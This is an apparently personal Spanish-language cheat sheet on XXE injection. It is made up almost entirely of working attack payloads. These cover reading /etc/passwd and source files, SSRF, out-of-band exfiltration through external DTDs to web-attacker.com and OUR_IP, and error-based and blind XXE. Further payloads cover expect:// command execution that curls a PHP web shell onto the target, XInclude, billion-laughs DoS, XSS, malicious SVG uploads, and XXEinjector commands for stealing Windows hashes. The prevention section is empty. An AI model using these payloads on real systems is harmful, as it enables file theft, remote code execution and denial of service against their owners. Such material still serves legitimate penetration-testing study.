# XML external entity (XXE) injection

## Table of contents

- [XML external entity (XXE) injection](#xml-external-entity-xxe-injection)
  - [INTRODUCCION](#introduccion)
  - [Estructura](#estructura)
  - [¿Qué es una entidad?](#qu-es-una-entidad)
  - [¿Qué son los elementos XML?](#qu-son-los-elementos-xml)
  - [¿Qué es la definición de tipo de documento (DTD)?](#qu-es-la-definicin-de-tipo-de-documento-dtd)
  - [IDENTIFICACION](#identificacion)
  - [XXE para recuperar archivos](#xxe-para-recuperar-archivos)
  - [XXE para realizar ataques SSRF](#xxe-para-realizar-ataques-ssrf)
  - [XXE lectura de codigo fuente](#xxe-lectura-de-codigo-fuente)
  - [XXE a RCE](#xxe-a-rce)
  - [Advanced Exfiltration with CDATA](#advanced-exfiltration-with-cdata)
  - [ERROR BASED XXE](#error-based-xxe)
  - [Vulnerabilidades de Blind XXE](#vulnerabilidades-de-blind-xxe)
      - [USANDO UN DTD EXTERNO](#usando-un-dtd-externo)
    - [Explotación de ciegas XXE para recuperar datos a través de mensajes de error](#explotacin-de-ciegas-xxe-para-recuperar-datos-a-travs-de-mensajes-de-error)
  - [EXFILTRACION DE DATOS A CIEGAS CON XXEINJECTOR](#exfiltracion-de-datos-a-ciegas-con-xxeinjector)
  - [XInclude ataques](#xinclude-ataques)
  - [ATAQUES DoS (Billion Laugh Attack)](#ataques-dos-billion-laugh-attack)
  - [XSS via XXE](#xss-via-xxe)
  - [TOOLS](#tools)
  - [MAS PAYLOADS](#mas-payloads)
  - [PREVENCION](#prevencion)

## INTRODUCCION

La inyección de entidad externa XML (también conocida como XXE) es una vulnerabilidad de seguridad web que permite a un atacante interferir con el procesamiento de datos XML de una aplicación. A menudo permite que un atacante vea archivos en el sistema de archivos del servidor de aplicaciones e interactúe con cualquier sistema de back-end o externo al que la aplicación pueda acceder.

Algunas aplicaciones utilizan el formato XML para transmitir datos entre el navegador y el servidor. Las aplicaciones que hacen esto prácticamente siempre usan una biblioteca estándar o API de plataforma para procesar los datos XML en el servidor.

## Estructura

![foto](XXE%20images/1.png)

-   **Versión:** se utiliza para especificar qué versión del estándar XML se está utilizando.
    -   **Valores:** 1.0
-   **Codificación:** se declara para especificar la codificación a utilizar. La codificación predeterminada que se utiliza en XML es UTF-8.
    -   **Valores:** UTF-8, UTF-16, ISO-10646-UCS-2, ISO-10646-UCS-4, Shift_JIS, ISO-2022-JP, ISO-8859-1 a ISO-8859-9, EUC-JP
-   **Independiente:** informa al analizador si el documento tiene algún enlace a una fuente externa o si hay alguna referencia a un documento externo. El valor predeterminado es no.
    -   **Valores:** si, no

## ¿Qué es una entidad?

Son la forma de representar datos que están presentes dentro de un documento XML. Hay varias entidades integradas en lenguaje XML como `&lt;` y `&gt;` que se utilizan para menor que y mayor que en lenguaje XML. Todos estos son metacaracteres que generalmente se representan mediante entidades que aparecen en los datos. Las entidades externas XML son las entidades que se encuentran fuera de DTD.

La declaración de una entidad externa usa la palabra clave SYSTEM y debe especificar una URL desde la cual se debe cargar el valor de la entidad. Por ejemplo:

```xml
<!ENTITY foo SYSTEM "URL">
```

- `foo` es el nombre de la entidad.
- `SYSTEM` es la keyword usada.
- `URL` es la URL que queremos obtener al realizar un ataque XXE.

## ¿Qué son los elementos XML?

Las declaraciones de tipo de elemento establecen las reglas para el tipo y la cantidad de elementos que pueden aparecer en un documento XML, qué elementos pueden aparecer unos dentro de otros y en qué orden deben aparecer. Por ejemplo:

-   `<!ELEMENT stockCheck ANY>` Significa que cualquier objeto podría estar dentro del padre `<stockCheck></stockCheck>`
-   `<! ELEMENTO stockCheck EMPTY>` Significa que debe estar vacío `<stockCheck></stockCheck>`
-  `<! ELEMENT stockCheck (productId, storeId)>` Declara que pueden tener los hijos y`<stockCheck>``<productId>``<storeId>`

## ¿Qué es la definición de tipo de documento (DTD)?

Se utiliza para la declaración de la estructura del documento XML, tipos de valor de datos que puede contener, etc. DTD puede estar presente dentro del archivo XML o puede definirse por separado. Se declara al principio de XML usando <! DOCTYPE>.

El siguiente es un ejemplo de DTD para el documento XML que vimos anteriormente:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

Después de eso, cada uno de los elementos secundarios también se declara, donde algunos de ellos también tienen elementos secundarios, mientras que otros solo pueden contener datos sin procesar (como lo indica `PCDATA`).

La DTD anterior se puede colocar dentro del propio documento XML, justo después de la primera línea `XML Declaration`. De lo contrario, se puede almacenar en un archivo externo (p. ej `email.dtd`.), y luego hacer referencia dentro del documento XML con la palabra clave `SYSTEM`, de la siguiente manera:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

También es posible hacer referencia a una DTD a través de una URL, de la siguiente manera:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

## IDENTIFICACION

El primer paso para identificar posibles vulnerabilidades XXE es encontrar páginas web que acepten una entrada de usuario XML.

si vemos que un parametro del XML se refleja en la respuesta de la peticion, podemos intentar imprimir una variable cualquiera:

```xxe
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
...
	<email>&company;</email>
...
</root>
```

![[Pasted image 20230124170343.png]]

>[!note]
>Algunas aplicaciones web pueden tener un formato JSON predeterminado en la solicitud HTTP, pero aún pueden aceptar otros formatos, incluido XML. Por lo tanto, incluso si una aplicación web envía solicitudes en formato JSON, podemos intentar cambiar el header `Content-Type` a `application/xml` y luego convertir los datos JSON a XML con una [herramienta en línea](https://www.convertjson.com/json-to-xml.htm) .


## XXE para recuperar archivos

Por ejemplo, supongamos que una aplicación de compras comprueba el nivel de existencias de un producto enviando el siguiente XML al servidor:

**NOTA: ES NECESARIO, DE ALGUNA MANERA, CONOCER LA ESTRUCTURA XML QUE ACEPTA LA PAGINA (REVISAR CODIGO FUENTE, JS, ETC.)**

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<stockCheck>
	<productId>381</productId>
</stockCheck>
```

La aplicación no realiza defensas particulares contra ataques XXE, por lo que puede aprovechar la vulnerabilidad XXE para recuperar el archivo `/etc/passwd` enviando la siguiente carga útil XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [ 
	<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>  
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```

Puedes cargar un SVG para recuperar archivos:

```xml
<?XML version="1.0" standalone="yes"?> 
<!DOCTYPE reset [ 
	<!ENTITY xxe SYSTEM "file:///etc/hostname"> 
]> 
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"> 
	<text font-size="40" x="0" y="100">&xxe;</text>
</svg>
```

**NOTA**

**Se puede usar todas las formas de LFI para llamar a un archivo mediante XXE.**
**Mediante el wrapper expect se puede derivar a un RCE depende la configuracion.**

**PRACTICAR**

- [https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)

## XXE para realizar ataques SSRF

Al igual que invocamos a un archivo del servidor podemos intentar acceder a una ruta de la pagina del servidor que no tenemos acceso haciendo creer que la peticion tiene como origen 127.0.0.1, es decir localhost o desde el mismo servidor.

Debemos editcar el contenido de la URL:

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/admin"> ]>  
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## XXE lectura de codigo fuente

Al igualñ que LFI, podemos pedir un archivo en base64 para leer su contenido:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

![[Pasted image 20230124170726.png]]

## XXE a RCE

es posible que podamos ejecutar comandos en aplicaciones web basadas en PHP a través del filtro `PHP://expect`, aunque esto requiere que el módulo `expect` PHP esté instalado y habilitado.

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://id">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

El método más eficiente para convertir XXE en RCE es obtener un shell web de nuestro servidor y escribirlo en la aplicación web, y luego podemos interactuar con él para ejecutar comandos. Para hacerlo, podemos comenzar escribiendo un shell web PHP básico e iniciando un servidor web python, de la siguiente manera:

>[!note]
>tenemos que tener alcance con el equipo. (visibilidad por ping)

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

Ahora, podemos usar el siguiente código XML para ejecutar un comando `curl` que descargue nuestro shell web en el servidor remoto:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

>[!tip]
>reemplazamos todos los espacios en el código XML anterior con `$IFS`, para evitar romper la sintaxis XML. Además, muchos otros caracteres como `|`, `>` y `{` pueden romper el código, por lo que debemos evitar usarlos.

Una vez que enviamos la solicitud, deberíamos recibir una solicitud en nuestra máquina para el archivo `shell.php`, después de lo cual podemos interactuar con el shell web en el servidor remoto para la ejecución del código.

>[!note]
>El módulo expect no está habilitado/instalado de forma predeterminada en los servidores PHP modernos, por lo que este ataque puede no funcionar siempre. Esta es la razón por la que XXE generalmente se usa para divulgar archivos locales confidenciales y código fuente, lo que puede revelar vulnerabilidades adicionales o formas de obtener la ejecución del código.

## XML PARAMETER ENTITY

Un tipo especial de entidad que comienza con un carácter `%` y solo se puede usar dentro de la DTD (DOCTYPE interno o externo). Lo que es único acerca de las entidades de parámetros es que si las referenciamos desde una fuente externa (por ejemplo, nuestro propio servidor), entonces todas ellas se considerarían externas y se pueden unir.

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://rwrh125de0xdvqhxr06xqjsd44avyk.burpcollaborator.net"> 
%xxe; <!--se lo declara dentro del DTD-->
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

![[Pasted image 20230204205949.png]]

>[!note]
>La entidad especial comienza con porcentaje y un espacio `% `.

## Advanced Exfiltration with CDATA

En la anterior seccion vimos como habia caracteres que podian romper la estructura del XML como el caracter **espacio** y por eso lo reemplazabamos con `$IFS`. 

Para generar datos que no se ajustan al formato XML, podemos envolver el contenido de la referencia del archivo externo con una etiqueta `CDATA` (p. ej `<![CDATA[ FILE_CONTENT ]]>`). De esta forma, el analizador XML consideraría esta parte como datos sin procesar, que pueden contener cualquier tipo de datos, incluidos los caracteres especiales.

Una manera fácil de abordar este problema sería definir 

- Una entidad interna `begin` con el valor `<![CDATA[`.
- Una entidad interna `file` con el valor que queramos leer `SYSTEM "file:///var/www/html/submitDetails.php"`.
- Una entidad interna `end` con el valor `]]>`.

Despues creamos una entidad que una estas 3 entidades para concatenerlas:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Un tipo especial de entidad que comienza con un carácter `%` y solo se puede usar dentro de la DTD. Lo que es único acerca de las entidades de parámetros es que si las referenciamos desde una fuente externa (por ejemplo, nuestro propio servidor), entonces todas ellas se considerarían externas y se pueden unir.

Por lo tanto, intentemos leer un archivo almacenando mediante un archivo DTD (por ejemplo `xxe.dtd`), alojado en nuestra máquina y luego haga referencia a él como una entidad externa en la aplicación web de destino, de la siguiente manera:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

invocaacion:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  %xxe;
]>
...
<</email> <!-- reference the &joined; entity to print the file content -->
```

de esta manera podriamos leer un archivo **.php** sin tener que codificar a base64:

![[Pasted image 20230124203209.png]]

>[!tip]
>Este truco puede ser muy útil cuando el método XXE básico no funciona o cuando se trata de otros marcos de desarrollo web.

## ERROR BASED XXE

Si la aplicación web muestra errores de tiempo de ejecución (por ejemplo, errores de PHP) y no tiene un manejo de excepciones adecuado para la entrada XML, entonces podemos usar esta falla para leer la salida del exploit XXE.

**_Esta tecnica, a diferencia de un blind XXE, al menos reporta un error en la respuesta. Un blind XXE no mostraria ni resultado ni error._**

Primero, intentemos enviar datos XML con formato incorrecto y veamos si la aplicación web muestra algún error. Para hacerlo, podemos eliminar cualquiera de las etiquetas de cierre, cambiar una de ellas para que no se cierre (por ejemplo , `<roo>`en lugar de `<root>`), o simplemente hacer referencia a una entidad que no existe, de la siguiente manera:

![[Pasted image 20230124203615.png]]

Vemos que efectivamente causamos que la aplicación web mostrara un error, y también reveló el directorio del servidor web, que podemos usar para leer el código fuente de otros archivos. Ahora, podemos explotar esta falla para filtrar el contenido del archivo.

Primero, alojaremos un archivo DTD que contiene la siguiente carga útil:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY &#x25; content SYSTEM '%nonExistingEntity;/%file;'>">
```

La carga útil anterior define la `file`entidad del parámetro y luego la une con una entidad que no existe. En este caso, `%nonExistingEntity;` no existe, por lo que la aplicación web arrojaría un error diciendo que esta entidad no existe, junto con nuestra unión `%file;` como parte del error. Hay muchas otras variables que pueden causar un error, como un URI incorrecto o caracteres incorrectos en el archivo al que se hace referencia.

Ahora, podemos llamar a nuestro script DTD externo y luego hacer referencia a la entidad `error`, de la siguiente manera:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

![[Pasted image 20230124211547.png]]

Este método también se puede utilizar para leer el código fuente de los archivos. Todo lo que tenemos que hacer es cambiar el nombre del archivo en nuestro script DTD para que apunte al archivo que queremos leer (por ejemplo, `"file:///var/www/html/submitDetails.php"`).

otra carga util valida tambien puede ser esto:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
%eval; 
%error;
```

>[!note]
>Tenemos que quitar la estructura XML que se envia o crear una etiqueta erronea para generar un error y que se muestre la carga util

## Vulnerabilidades de Blind XXE

Las vulnerabilidades ciegas de XXE surgen cuando la aplicación es vulnerable a la inyección de XXE pero no devuelve los valores de ninguna entidad externa definida dentro de sus respuestas. Esto significa que la recuperación directa de archivos del lado del servidor no es posible, por lo que el XXE ciego es generalmente más difícil de explotar que las vulnerabilidades XXE normales.

Como no se refleja nada por la pagina web o la respuesta de la peticion, la unica interaccion la tendremos con nuestro equipo por un servidor web en python mandando una peticion por el XXE y viendo por el python si realiza la peticion a pesar de que no se muestre nada por la pantalla de la web.

nos creamos localmente el archivo **data.xml**:

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
```

una entidad `file` que obtenga el `/etc/passwd` en base64, esto para que nos lo pase como parametro por la URL a nuestra maquina atacante.

```xml
<!ENTITY % poc "<!ENTITY &#x25; xxe SYSTEM 'http://<IP KALI>:<PUERTO>/value=?%file;'>">
```

Creamos una entidad `poc` que tiene otra entidad llamada `xxe` donde realiza una peticion GET a nuestra maquina pasando un parametro `value` por la URL que sera la entidad file `%file` que contiene el /etc/passwd en base64.

>[!note]
>cuando se nombre una entidad, dentro de otra entidad el porcentaje de la segunda entidad tiene que ir en Hexadecimal. (`&#x25;  == %`)

Compartimos el archivo **data.xml** por un servidor en python:

```python
python -m SimpleHTTPServer
```

Y solicitamos el archivo **data.xml** desde la pagina web:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://<IP-KALI>:<PUERTO>/data.xml"
%remote;
%poc;
%xxe;
]>
```

primero llamamos la entidad `remote`, despues la entidad `poc` del archivo **data.xml** y despues de `xxe`.

Al mandar este XXE vamos a ver en nuestro servidor en python que se realiza una peticion GET de la pagina web donde se manda el parametro value con el contenido del `/etc/passwd` en base64.

Realizamos el siguiente comando para ver el contenido en texto claro:

```bash
echo "/etc/passwd en base64" | base64 -d; echo
```


otra forma es la siguiente **data.xml**:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">  
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">  
%eval;  
%exfiltrate;
```

Este DTD realiza los siguientes pasos:

-   Define una entidad de parámetro XML llamada `file`, que contiene el contenido del `/etc/passwd` archivo.
-   Define una entidad de parámetro XML llamada `eval`, que contiene una declaración dinámica de otra entidad de parámetro XML llamada `exfiltrate`. La `exfiltrate` entidad se evaluará mediante una solicitud HTTP al servidor web del atacante que contiene el valor de la `file` entidad dentro de la cadena de consulta URL.
-   Utiliza la `eval` entidad, lo que provoca `exfiltrate` que se realice la declaración dinámica de la entidad.
-   Utiliza la `exfiltrate` entidad, por lo que su valor se evalúa solicitando la URL especificada.

montamos un servidor en python.

Finalmente, el atacante debe enviar la siguiente carga útil XXE a la aplicación vulnerable:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM  
"http://<IP-KALI>:<PUERTO>/data.xml"> %xxe;]>
```

El archivo **data.xml** puede tener la extension **data.dtd** depende la configuracion del servidor.

#### USANDO UN DTD EXTERNO

podemos crearnos un archivo dtd con el siguiente contenido: (**xxe.dtd**)

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/hey.php?content=%file;'>">
```

donde:

- la entidad `file` tiene el contenido de un archivo en base64.
- la entidad `oob` (Out-of-Band) realiza la consulta GET a una URL externa y pasa el contenido en base64 como parametro por url.

nos montamos un servidor con PHP que reciba esta informacion y la decodifique:

**_hey.php_**

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```shell-session
php -S 0.0.0.0:8000
```

realizamos la injeccion XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

>[!tip]
>además de almacenar nuestros datos codificados en base64 como un parámetro para nuestra URL, podemos utilizar `DNS OOB Exfiltration`colocando los datos codificados como un subdominio para nuestra URL (por ejemplo `ENCODEDTEXT.our.website.com`), y luego usar una herramienta `tcpdump`para capturar cualquier tráfico entrante y decodificar la cadena de subdominio para obtener los datos. Por supuesto, este método es más avanzado y requiere más esfuerzo para extraer datos.

### Explotación de ciegas XXE para recuperar datos a través de mensajes de error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">  
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">  
%eval;  
%error;
```

Este DTD realiza los siguientes pasos:

-   Define una entidad de parámetro XML llamada `file`, que contiene el contenido del `/etc/passwd` archivo.
-   Define una entidad de parámetro XML llamada `eval`, que contiene una declaración dinámica de otra entidad de parámetro XML llamada `error`. La `error` entidad se evaluará cargando un archivo inexistente cuyo nombre contenga el valor de la `file` entidad.
-   Utiliza la `eval`entidad, lo que provoca `error` que se realice la declaración dinámica de la entidad.
-   Utiliza la `error` entidad, por lo que su valor se evalúa al intentar cargar el archivo inexistente, lo que da como resultado un mensaje de error que contiene el nombre del archivo inexistente, que es el contenido del `/etc/passwd` archivo.

Invocar la DTD externa maliciosa resultará en un mensaje de error como el siguiente:

```bash
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
...
```

## EXFILTRACION DE DATOS A CIEGAS CON XXEINJECTOR

podemos automatizar el proceso de exfiltración ciega de datos XXE con herramientas. Una de esas herramientas es [XXEinjector](https://github.com/enjoiz/XXEinjector) .

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Una vez que tengamos la herramienta, podemos copiar la solicitud HTTP de Burp y escribirla en un archivo para que la use la herramienta. No debemos incluir los datos XML completos, solo la primera línea, y escribir después `XXEINJECT` como un localizador de posición para la herramienta:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Ahora, podemos ejecutar la herramienta:

- con las opciones `--host` y `--httpport` siendo nuestra IP y puerto
- la opcion `--file` es el archivo que escribimos arriba 
- la opcion `--path` es el archivo que queremos leer
- la opcion `--oob=http` y `--phpfilter` para repetir el ataque OOB con un archivo externo y codificando en base64.

```bash
ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

## XInclude ataques

Algunas aplicaciones reciben datos enviados por el cliente, los incrustan en el lado del servidor en un documento XML y luego analizan el documento. 

En esta situación, no puede realizar un ataque XXE clásico, porque no controla todo el documento XML y, por lo tanto, no puede definir o modificar un elemento `DOCTYPE`. Sin embargo, es posible que pueda usar `XInclude` en su lugar. `XInclude` es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos. Puede colocar un `XInclude` ataque dentro de cualquier valor de datos en un documento XML, por lo que el ataque se puede realizar en situaciones en las que solo controla un solo elemento de datos que se coloca en un documento XML del lado del servidor.

Podemos tener un envio de datos que aparentemente no usa XML:

![[Pasted image 20230204224645.png]]

Pero si uno de los valores enviados en el servidor es incrustado en un documento XML, aun es vulnerable a XXE Injection.
Burpsuite detecta esto con el Burpsuite active scan:

![[Pasted image 20230204224842.png]]

Al no existir una estructura XML, podemos intentar un ataque con **XInclude**.

Para realizar un ataque `XInclude`, debe hacer referencia al espacio `XInclude` de nombres y proporcionar la ruta al archivo que desea incluir. Por ejemplo:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">  
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

esta carga util debemos colocar reemplazando en el valor afectado o que es vulnerable a la inyeccion:

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

>[!note]
>La carga util debe ir en una misma linea sin salto de linea (`\n`)

![[Pasted image 20230204225124.png]]

puede usar URL encoded:

![[Pasted image 20230204225206.png]]

## ATAQUES DoS (Billion Laugh Attack)

Este ataque también se conoce como bomba XML o XML DoS o ataque de expansión de entidad exponencial. 

Basicamente esto causa un Denial of service desde un XXE.

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>

```

Declaramos varias entidades donde una llama a la otra multiples veces. Al final solo invocamos la ultima y se desencadena una llamada recursida de una entidad para asi causar un DoS.

Esta el la version con YAML:

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

## XSS via XXE

```xml
<![CDATA[<]]>img src="" onerror=javascript:alert(1)<![CDATA[>]]>
```

## XXE via image file upload

Si se tiene una carga de archivos disponible podemos realizar la creacion de un **.svg** malicioso y aprovechar un XXE injection. Esta seria la carga util:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

lo guardamos como **xxe.svg** y lo enviamos. Estamos pidiendo la salida del comando **/etc/hostname**. Si es vulnerable la pagina podemos ver el contenido del archivo reflejado en la foto cargada dentro de la pagina:

![[Pasted image 20230204230536.png]]

![[Pasted image 20230204230415.png]]

![[Pasted image 20230204230455.png]]

## TOOLS

-   [xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads
    
```bash
sudo ./xxeftp -uno 443
./xxeftp -w -wps 5555
```
    
-   [230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)
    
```bash
python3 230.py 2121
```
    
-   [XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
    
```bash
# Enumerating /etc directory in HTTPS application:
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
# Enumerating /etc directory using gopher for OOB method:
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
# Second order exploitation:
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
# Bruteforcing files using HTTP out of band method and netdoc protocol:
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
# Enumerating using direct exploitation:
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
# Enumerating unfiltered ports:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
# Stealing Windows hashes:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
# Uploading files using Java jar:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
# Executing system commands using PHP expect:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
# Testing for XSLT injection:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
# Log requests only:
ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt

```
    
-   [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
    
```bash
ruby server.rb
```
    
-   [docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
    
```bash
./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx

./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place

./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place

./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
```
    
-   [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - Toolbox intended to allow useful exploitation of XXE vulnerabilities.

```bash
python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
	
```

## MAS PAYLOADS
classic XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

```

`SYSTEM` and `PUBLIC` are almost synonym.

base64 encoded:

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

XXE with wrappers PHP:

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

XInclude:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## PREVENCION

